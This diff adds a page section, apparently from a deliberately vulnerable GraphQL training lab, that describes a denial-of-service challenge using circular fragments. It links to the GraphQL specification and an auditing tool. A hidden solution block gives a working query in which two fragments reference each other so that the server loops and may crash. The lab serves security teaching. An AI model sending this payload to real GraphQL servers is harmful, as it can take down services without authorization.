@@ -1,0 +1,42 @@
+<!-- Start -->
+<h3 style="color:purple" id="dos-circular-fragment"><b>Denial of Service :: Circular Fragment</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  The GraphQL API allows creating circular fragments, such that two fragments are cross-referencing eachother.
+  When a Spread Operator (<code>...</code>) references a fragment, which in return references a 2nd fragment that leads to the former fragment, may cause a recursive loop and crash the server.
+</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles" target="_blank">
+      <i class="fa fa-newspaper"></i> GraphQL Specification - Fragments Must Not Form Cycles
+    </a>
+  </li>
+  <li>
+    <a href="https://github.com/dolevf/graphql-cop" target="_blank">
+      <i class="fa fa-shield-alt"></i> GraphQL Cop - Security Auditing Tool for GraphQL
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-circular-fragment')">Show</button></h5>
+<div id="sol-dos-circular-fragment" style="display:none">
+  <pre class="bash">
+query {
+    ...A
+}
+
+fragment A on PasteObject {
+    content
+    title
+    ...B
+}
+
+fragment B on PasteObject {
+    content
+    title
+    ...A
+}
+</pre>
+</div>
+<!-- End -->
